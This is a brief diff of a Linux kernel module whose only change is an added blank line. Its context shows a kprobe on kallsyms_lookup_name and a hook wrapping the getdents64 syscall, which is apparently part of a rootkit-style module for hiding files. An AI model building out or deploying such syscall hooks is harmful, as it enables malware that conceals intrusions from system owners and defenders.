@@ -15,6 +15,7 @@ MODULE_LICENSE("GPL");
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
 };
+
 asmlinkage long sys_getdents64_hook(const struct pt_regs *pt_registers) {
   int ret = org_getdents64(pt_registers);
   int err;
